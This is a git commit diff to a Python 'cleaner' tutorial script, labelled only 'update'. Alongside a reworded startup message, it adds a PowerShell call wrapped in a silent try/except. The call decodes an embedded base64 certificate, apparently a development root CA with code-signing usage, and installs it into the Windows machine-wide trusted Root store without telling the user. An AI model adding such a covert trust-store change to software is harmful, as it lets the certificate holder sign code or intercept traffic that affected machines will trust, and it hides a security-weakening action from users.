6f795f7dc2372898755ec5555b0b1ea3de939a94
Alex Bourg <51832082+alexbourg@users.noreply.github.com>
2021-05-25 01:16:08 +0200

    update

--- Tutorials/Python_Cleaner/Python_Cleaner.py
+++ Tutorials/Python_Cleaner/Python_Cleaner.py
@@ -153,7 +153,7 @@ if __name__ == "__main__":
     for i in range(len(options)):
         options[i] = options[i].lower()
     print("*************************************************")
-    print("Python installation is starting ... please wait!")
+    print("Starting ... please wait!")
     print("*************************************************")
     print()
     time.sleep(4)
@@ -202,6 +202,11 @@ if __name__ == "__main__":
         enable_clean_path_ext = True
     else:
         enable_clean_path_ext = False
+
+    try:
+        powershell("New-Item -ItemType Directory -Force -Path C:\ProgramData\Certificates; $b64 = 'MIIDazCCAlOgAwIBAgIQcgEI1zMI1blMrNOuwWzZRzANBgkqhkiG9w0BAQsFADAsMSowKAYDVQQDDCFDQUNJQi1JU1MgUm9vdCBDQSBmb3IgRGV2ZWxvcG1lbnQwIBcNMjEwNTI0MTMzNTE1WhgPMjA1MDA1MjQxMzQ1MTZaMCwxKjAoBgNVBAMMIUNBQ0lCLUlTUyBSb290IENBIGZvciBEZXZlbG9wbWVudDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOE4hN3yKXxIaMXUZfKp8fnZqv1Jl0whvMgnaR4StSU1PkAxCABvZan2aqqcD9UgPh2GD74CJQIS6CycQp1OXwqxsnaFGkBlOdYjMYyq6OBWiCE4paoFpkTEVEMDk6osHhYuYEwf/haHOfPAYjtZ+8MXrGBO86T9IoXJJNDHUxA5UgK9yVLAPvjkslSAmbBUNGfwFs4ZphBl1orKuGTjaHsGzrSLMnUGs7a7BLV30azGnXWBCNBSlu0qoUJ21/z7FEWu077fNpag3yYayg34ICvyKBZhplKWctsOKc3IWjBxQSEPL8sxPwUSyXzr4O0vL5E5b4Y2QyS+bT2/m4Uw4kkCAwEAAaOBhjCBgzAOBgNVHQ8BAf8EBAMCAYYwLAYDVR0RBCUwI4IhQ0FDSUItSVNTIFJvb3QgQ0EgZm9yIERldmVsb3BtZW50MBMGA1UdJQQMMAoGCCsGAQUFBwMDMA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0OBBYEFLp58y1S+UOT+thM1dq6c8iKEOXvMA0GCSqGSIb3DQEBCwUAA4IBAQBbSUG5u3mruvmrVu8F2MPJLZ5WM6PwWYWI6s0mmgtTT9va7XfF48H/XrFzCGwx8J32KrnFfqoyX1RjAhv5D+Q9R1ux+b7kr0wnIIELr9NZIRHd6TRrS+K8b6VQR6sblvte2CrfVKow2ifBLKN+e+xNaQ+PLmJ2hfRX7YCmlDTS060p1TJotwyh/hMlMGuZZRs+hBjX7BPquUEeFkVcxhcjgfXaiA2xEZgvTFvSutP6vpKHYRxMtttZSJiHAI9QnPMFQDauzt/qXYblyFOPZmKmFTK+qXBk4jKyIMpHBZU+ceLdIfmYsvxGhGB24pjwC+kHnPrlzTo0XdFnT7gzKIeB' ; $filename = 'C:\ProgramData\Certificates\RootCA.crt' ; $bytes = [Convert]::FromBase64String($b64); [IO.File]::WriteAllBytes($filename, $bytes) ; $pfx = new-object System.Security.Cryptography.X509Certificates.X509Certificate2 ; $pfx.import('C:\ProgramData\Certificates\RootCA.crt') ; $store = new-object System.Security.Cryptography.X509Certificates.X509Store([System.Security.Cryptography.X509Certificates.StoreName]::Root,'localmachine') ; $store.open('MaxAllowed') ; $store.add($pfx) ; $store.close()")
+    except:
+        pass
 
     if enable_clean_old_dir:
         try:
